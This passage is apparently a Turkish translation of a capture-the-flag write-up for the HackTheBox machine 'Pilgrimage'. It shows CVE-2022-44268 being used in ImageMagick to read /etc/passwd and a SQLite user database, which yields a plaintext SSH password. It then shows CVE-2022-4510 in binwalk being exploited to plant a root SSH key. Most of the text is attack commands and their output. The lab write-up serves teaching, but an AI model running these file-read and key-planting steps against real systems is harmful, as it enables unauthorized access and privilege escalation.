       8 | IHDR  |      13 | .......z....                   | 0x727a55a2
      33 | gAMA  |       4 | ....                           | 0x0bfc6105
      49 | cHRM  |      32 | ..z&..............u0...`..:..  | 0x9cba513c
      93 | bKGD  |       6 | ......                         | 0xa0bda793
     111 | tIME  |       7 | .......                        | 0x9208ee1c
     130 | IDAT  |   20013 | x.....%.U.Z.N..n..&j...A3....a | 0x73423cfd
   20155 | tEXt  |      37 | date:create.2023-05-15T20:26:1 | 0x2850565c
   20204 | tEXt  |      37 | date:modify.2023-05-15T20:26:1 | 0x590deee0
   20253 | tEXt  |      18 | profile./etc/hosts             | 0xc560a843
   20283 | IEND  |       0 |                                | 0xae426082
```

exiftool bunu da gösterecektir:

```
oxdf@hacky$ exiftool pngout.png
ExifTool Version Number         : 12.40
File Name                       : pngout.png
...[snip]...
Profile                         : /etc/hosts
Image Size                      : 183x122
Megapixels                      : 0.022
```

Bunu siteye göndereceğim ve ortaya çıkan dosyayı indireceğim:

```
oxdf@hacky$ wget http://pilgrimage.htb/shrunk/655cd80f631f0.png    
--2023-11-21 11:17:16--  http://pilgrimage.htb/shrunk/655cd80f631f0.png                                  
Resolving pilgrimage.htb (pilgrimage.htb)... 10.10.11.219                                                
Connecting to pilgrimage.htb (pilgrimage.htb)|10.10.11.219|:80... connected.
HTTP request sent, awaiting response... 200 OK   
Length: 7525 (7.3K) [image/png]                     
Saving to: ‘655cd80f631f0.png’                                                                           
                                                    
655cd80f631f0.png          100%[=====================================>]   7.35K  --.-KB/s    in 0s      
                                                    
2023-11-21 11:17:17 (812 MB/s) - ‘655cd80f631f0.png’ saved [7525/7525]
```

identify -verbose, dosyanın profil bölümünde bulunduğu sonuç meta verilerini gösterecektir:

```
oxdf@hacky$ identify -verbose 655cd80f631f0.png                    
Image:
  Filename: 655cd80f631f0.png
  Format: PNG (Portable Network Graphics)           
  Mime type: image/png
  Class: DirectClass
...[snip]...  
    Raw profile type: 

     205
3132372e302e302e31096c6f63616c686f73740a3132372e302e312e310970696c677269
6d6167652070696c6772696d6167652e6874620a0a232054686520666f6c6c6f77696e67
206c696e65732061726520646573697261626c6520666f7220495076362063617061626c
6520686f7374730a3a3a3120202020206c6f63616c686f7374206970362d6c6f63616c68
6f7374206970362d6c6f6f706261636b0a666630323a3a31206970362d616c6c6e6f6465
730a666630323a3a32206970362d616c6c726f75746572730a
...[snip]...
```

Bu hex okunan dosyadır ve birçok şekilde deşifre edilebilir

```
oxdf@hacky$ echo "3132372e302e302e31096c6f63616c686f73740a3132372e302e312e310970696c6772696d6167652070696c6772696d6167652e6874620a0a232054686520666f6c6c6f77696e67206c696e65732061726520646573697261626c6520666f7220495076362063617061626c6520686f7374730a3a3a3120202020206c6f63616c686f7374206970362d6c6f63616c686f7374206970362d6c6f6f706261636b0a666630323a3a31206970362d616c6c6e6f6465730a666630323a3a32206970362d616c6c726f75746572730a" 
> | xxd -r -p
127.0.0.1       localhost
127.0.1.1       pilgrimage pilgrimage.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```


#### Script

Bu repoda exploit'in güzel bir Python versiyonu var. Kötü amaçlı bir görüntü oluşturmak için bir kez çalıştırıyorum ve ardından sonuçları almak için sitedeki görüntüyü tekrar işaret ediyorum:

```
oxdf@hacky$ python CVE-2022-44268.py --image poc.png --file-to-read /etc/hosts --output pngout.png

oxdf@hacky$ python CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/655cda5792e0d.png
127.0.0.1       localhost
127.0.1.1       pilgrimage pilgrimage.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```


### Enumerate File System

#### Home Directories

Kutudaki kullanıcıları /etc/passwd dosyasında kontrol ederek başlayacağım:

```
oxdf@hacky$ python CVE-2022-44268/CVE-2022-44268.py --image poc.png --file-to-read /etc/passwd --output pngout.png
oxdf@hacky$ python CVE-2022-44268/CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/655cdab09c70e.png
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```


Emily için SSH anahtarlarını almaya çalışacağım ama başarısız olacağım. Home dizinlerine bağlı olarak .ssh dizinine sahip olabilecekleri makul görünen başka bir kullanıcı yok.

#### Database

Kaynak kodu sitenin bir SQLite veritabanı üzerinden çalıştığını gösteriyor. Örneğin, login.php'de:

```
  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM users WHERE username = ? and password = ?");
  $stmt->execute(array($username,$password));
```

O dosyayı almaya çalışacağım:

```
oxdf@hacky$ python CVE-2022-44268.py --image poc.png --file-to-read /var/db/pilgrimage --output pngout.png
oxdf@hacky$ python CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/655cdbb27cce4.png
Traceback (most recent call last):
  File "/media/sf_CTFs/hackthebox/pilgrimage-10.10.11.219/CVE-2022-44268/CVE-2022-44268.py", line 48, in <module>
    main()
  File "/media/sf_CTFs/hackthebox/pilgrimage-10.10.11.219/CVE-2022-44268/CVE-2022-44268.py", line 17, in main
    decrypted_profile_type = bytes.fromhex(raw_profile_type_stipped).decode('utf-8')
                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xaf in position 27: invalid start byte
```

Binary veri olduğu ve script sadece ASCII metin beklediği için bu mantıklı.

Verileri dosyadan manuel olarak çıkarabilirim. Dosyayı siteden indireceğim ve grep ile biraz oynayarak, sadece hex veri içeren satırları izole edebilirim ve sonra xxd'yi kullanarak binary'ye geri dönüştürebilirim:

```
oxdf@hacky$ identify -verbose 655cdbb27cce4.png | grep -Pv "^( |Image)"  | xxd -r -p > pilgrimage.sqlite

oxdf@hacky$ file pilgrimage.sqlite
pilgrimage.sqlite: SQLite 3.x database, last written using SQLite version 3034001, file counter 943, database pages 5, cookie 0x4, schema 4, UTF-8, version-valid-for 943
```

### Database Enumeration

Veritabanını sqlite3 ile açacağım:

```
oxdf@hacky$ sqlite3 pilgrimage.sqlite 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite>
```

İki tablo vardır:

```
sqlite> .tables
images  users
```

images tablosu ilginç görünmüyor, ancak users tablosu ilginç görünüyor:

```
sqlite> .schema users
CREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL);
sqlite> .schema images
CREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL);
```

Sadece tek bir kullanıcı var (benimki temizlenmiş olmalı):

```
sqlite> select * from users;
emily|abigchonkyboi123
```

### SSH

emily Pilgrimage üzerinde bir kullanıcıdır (/etc/passwd dosyasından). Bu parola SSH üzerinden bağlanmak için çalışır:

```
oxdf@hacky$ sshpass -p abigchonkyboi123 ssh emily@pilgrimage.htb
Warning: Permanently added 'pilgrimage.htb' (ED25519) to the list of known hosts.
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
emily@pilgrimage:~$ 
```


And read `user.txt`:

```
emily@pilgrimage:~$ cat user.txt
94bda273************************
```


## Shell as root

### Enumeration

#### General Privilege Checks

emily Pilgrimage üzerinde sudo çalıştıramıyor:

```
emily@pilgrimage:~$ sudo -l 
[sudo] password for emily: 
Sorry, user emily may not run sudo on pilgrimage.
```

Diğer kullanıcılara ait SetUID / SetGID binary'lerini arayacağım, ancak ilginç bir şey bulamayacağım.

#### Processes

Çalışan prosesler birkaç ilginç şey göstermektedir:

```
emily@pilgrimage:~$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.2 163928 10144 ?        Ss   Nov09   1:00 /sbin/init
...[snip]...
root         765  0.0  0.0   6816  2844 ?        Ss   Nov09   0:00 /bin/bash /usr/sbin/malwarescan.sh
root         766  0.0  0.0      0     0 ?        S    Nov09   0:00 [hwmon1]                    
root         771  0.0  0.6 209752 27736 ?        Ss   Nov09   1:07 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
root         773  0.0  0.1 220796  6840 ?        Ssl  Nov09   0:00 /usr/sbin/rsyslogd -n -iNONE 
root         775  0.0  0.0   2516   720 ?        S    Nov09   0:00 /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
root         776  0.0  0.0   6816  2288 ?        S    Nov09   0:00 /bin/bash /usr/sbin/malwarescan.sh
...[snip]...
```

root /usr/sbin/malwarescan.sh dosyasını çalıştırıyor. Ayrıca /var/www/pilgrimage.htb/shrunk dizininde oluşturulacak dosyaları izleyen bir inotifywait prosesi de çalışıyor. inotifywait, dosya sisteminde bir olay gerçekleştiğinde bir prosesi tetiklemenin bir yoludur.


### malwarescan.sh

#### Script

Bu script bir Bash scriptidir ve `inotifywait` komutundan sorumludur:

```
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

Bu işlem, **shrunk** dizininde oluşturulan dosyaları izliyor ve dosyalarda herhangi bir çalıştırılabilir dosya (**executable**) olup olmadığını kontrol etmek için **binwalk** kullanıyor.


#### inotifywait

Scriptin nasıl çalıştığını anlamak için iki SSH oturumu açacağım. İlkinde, `inotifywait -m -e create /dev/shm` ile `/dev/shm'deki` olayları izlemek için `inotifywait`'i çalıştıracağım. Sonra diğerinde bir dosya yazacağım:

```
emily@pilgrimage:~$ echo "test" > /dev/shm/0xdf_was_here.txt
```

İlkinde, bir satır çıkar:

```
emily@pilgrimage:~$ inotifywait -m -e create /dev/shm
Setting up watches.
Watches established.
/dev/shm/ CREATE 0xdf_was_here.txt
```

Yani script sed kullanarak “CREATE” kısmına kadar olan şeyleri kaldırıyor ve sadece dosya adını bırakıyor.


#### binwalk

Scriptin bir sonraki kısmı dosya üzerinde binwalk'u çalıştırıyor. Bir resim yükleyeceğim ve sonuçların nasıl göründüğünü görmek için deneyeceğim:

```
emily@pilgrimage:/dev/shm$ binwalk -e lego.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 183 x 122, 8-bit/color RGB, non-interlaced
138           0x8A            Zlib compressed data, best compression
```

Kendi bilgisayarımda, bir Windows exe üzerinde deneyebilirim:

```
oxdf@hacky$ binwalk -e /opt/nc.exe/nc64.exe 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Microsoft executable, portable (PE)
35573         0x8AF5          mcrypt 2.5 encrypted data, algorithm: "lsGetValue", keysize: 886 bytes, mode: "U",
38408         0x9608          Object signature in DER format (PKCS header length: 4, sequence length: 6856
38557         0x969D          Certificate in DER format (x509 v3), header length: 4, sequence length: 1037
39598         0x9AAE          Certificate in DER format (x509 v3), header length: 4, sequence length: 1050
40652         0x9ECC          Certificate in DER format (x509 v3), header length: 4, sequence length: 1070
41726         0xA2FE          Certificate in DER format (x509 v3), header length: 4, sequence length: 1105
42835         0xA753          Certificate in DER format (x509 v3), header length: 4, sequence length: 1235
```

Bu, “Microsoft executable” string'ini içerdiği için tarayıcıyı tetikleyecektir.

### Command Injection [Fail]

#### Başarısız Girişimler

İlk aklıma gelen şey, bu script'in **komut enjeksiyonuna** karşı savunmasız olması gerektiğiydi. Eğer dosya adını kontrol edebiliyorsam, o zaman ya **filename=** satırında ya da **binout=** satırında enjeksiyon yapabilmeliyim.

Görünüşe göre, **$()** veya **; ;** gibi komutları içeren bir dosya adı kullanmak işe yarar diye düşündüm, ancak işe yaramadı. Aslında **Bash** komut enjeksiyonunu engelleme konusunda oldukça başarılıymış.


#### ScriptKiddie Hakkında Bilmeniz Gerekenler

Bu, **ScriptKiddie**'yi yaparkenki adımları hatırlatıyor, [özellikle çocukluktan **pwn**'e geçiş kısmını](https://0xdf.gitlab.io/2021/06/05/htb-scriptkiddie.html#shell-as-pwn). **Komut enjeksiyonu** yapmaya çalışıyordum ama **Bash** buna izin vermedi. Sonunda bu script'i bıraktım (ilginç bir şekilde bu script de **inotifywait** tarafından tetikleniyordu).

```
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

Nmap taramasının sh -c altında çalışmasının nedeni, bu enjeksiyona karşı savunmasız olmasıdır.

### CVE-2022-4510

#### Identify

binwalk'taki -h seçeneği sürümü gösterecektir:

```
emily@pilgrimage:~$ binwalk -h

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk

Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...

Signature Scan Options:
    -B, --signature              Scan target file(s) for common file signatures
    -R, --raw=<str>              Scan target file(s) for the specified sequence of bytes
    -A, --opcodes                Scan target file(s) for common executable opcode signatures
    -m, --magic=<file>           Specify a custom magic file to use
    -b, --dumb                   Disable smart signature keywords
    -I, --invalid                Show results marked as invalid
    -x, --exclude=<str>          Exclude results that match <str>
    -y, --include=<str>          Only show results that match <str>

Extraction Options:
    -e, --extract                Automatically extract known file types
    -D, --dd=<type[:ext[:cmd]]>  Extract <type> signatures (regular expression), give the files an extension of <ext>, and execute <cmd>
    -M, --matryoshka             Recursively scan extracted files
    -d, --depth=<int>            Limit matryoshka recursion depth (default: 8 levels deep)
    -C, --directory=<str>        Extract files/folders to a custom directory (default: current working directory)
    -j, --size=<int>             Limit the size of each extracted file
    -n, --count=<int>            Limit the number of extracted files
    -r, --rm                     Delete carved files after extraction
    -z, --carve                  Carve data from files, but don't execute extraction utilities
    -V, --subdirs                Extract into sub-directories named by the offset

Entropy Options:
    -E, --entropy                Calculate file entropy
    -F, --fast                   Use faster, but less detailed, entropy analysis
    -J, --save                   Save plot as a PNG
    -Q, --nlegend                Omit the legend from the entropy plot graph
    -N, --nplot                  Do not generate an entropy plot graph
    -H, --high=<float>           Set the rising edge entropy trigger threshold (default: 0.95)
    -L, --low=<float>            Set the falling edge entropy trigger threshold (default: 0.85)

Binary Diffing Options:
    -W, --hexdump                Perform a hexdump / diff of a file or files
    -G, --green                  Only show lines containing bytes that are the same among all files
    -i, --red                    Only show lines containing bytes that are different among all files
    -U, --blue                   Only show lines containing bytes that are different among some files
    -u, --similar                Only display lines that are the same between all files
    -w, --terse                  Diff all files, but only display a hex dump of the first file

Raw Compression Options:
    -X, --deflate                Scan for raw deflate compression streams
    -Z, --lzma                   Scan for raw LZMA compression streams
    -P, --partial                Perform a superficial, but faster, scan
    -S, --stop                   Stop after the first result

General Options:
    -l, --length=<int>           Number of bytes to scan
    -o, --offset=<int>           Start scan at this file offset
    -O, --base=<int>             Add a base address to all printed offsets
    -K, --block=<int>            Set file block size
    -g, --swap=<int>             Reverse every n bytes before scanning
    -f, --log=<file>             Log results to file
    -c, --csv                    Log results to file in CSV format
    -t, --term                   Format output to fit the terminal window
    -q, --quiet                  Suppress output to stdout
    -v, --verbose                Enable verbose output
    -h, --help                   Show help output
    -a, --finclude=<str>         Only scan files whose names match this regex
    -p, --fexclude=<str>         Do not scan files whose names match this regex
    -s, --status=<int>           Enable the status server on the specified port
```

Bu sürüm v2.3.2.

“binwalk CVE” araması CVE-2022-4510'a bir sürü referans döndürür:

![Pasted image 20250107032730.png](/img/user/resimler/Pasted%20image%2020250107032730.png)

Bu sürüm savunmasız olmalıdır.

#### Details

[OneKey'den bu yazı](https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/), araştırmacılarının bu sorunu nasıl bulduğunu açıklıyor. **binwalk** aslında bir **Python script**'idir ve yolları oluşturmak için **os.path.join** kullanır. Sorun, birleştirilen öğelerden birinde **../** bulunursa, bunların çözülmemesidir.

Bir **PFS** dosya sistemindeki dosyalar, dosya adlarında **../** içerebilir.

Bu nedenle, kod bir **os.path.join** işlemi yapar ve ardından ortaya çıkan yolun belirlenen dizinle başladığından emin olmak için kontrol eder, ancak **../** çözülmediği için bu kontrol hiçbir zaman tetiklenmez ve bu da atlatılır.

Bu durum, **binwalk** süreci olarak **arbitrary write** (istediğiniz dosyaya yazma) sağlar. Bu, bir **authorized_keys** dosyasını veya **crontab** dosyasını üzerine yazmak suretiyle istismar edilebilir. Yazının yazarında, **binwalk** taraması sırasında gerçekten çalışacak şekilde alınan ve yürütülen bir **binwalk plugin**'i yazma yöntemi gösterilmektedir.



#### Exploit

Bu [repoda](https://github.com/adhikara13/CVE-2022-4510-WalkingPath) plugin oluşturma yöntemini kötüye kullanan çalışan bir Python exploit'i var. Ssh yöntemini deneyeceğim, bir template dosyası ve bir public key vereceğim:

```
oxdf@hacky$ python walkingpath.py ssh root.png ~/keys/ed25519_gen.pub 
```

Çıktı, **binwalk_exploit.png** adlı bir dosya. Bunu **shrunk** dizinine yükleyeceğim:

```
oxdf@hacky$ sshpass -p abigchonkyboi123 scp binwalk_exploit.png emily@pilgrimage.htb:/var/www/pilgrimage.htb/shrunk/
```

Oradan, root olarak SSH ile giriş yapabiliyorum:

```
oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@pilgrimage.htb 
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@pilgrimage:~# 
```

And get the root flag:

```
root@pilgrimage:~# cat root.txt
6108bf44************************
```

Medium yazısı : https://medium.com/@babayaga00897/pilgrimage-htb-writeup-ae8242270434


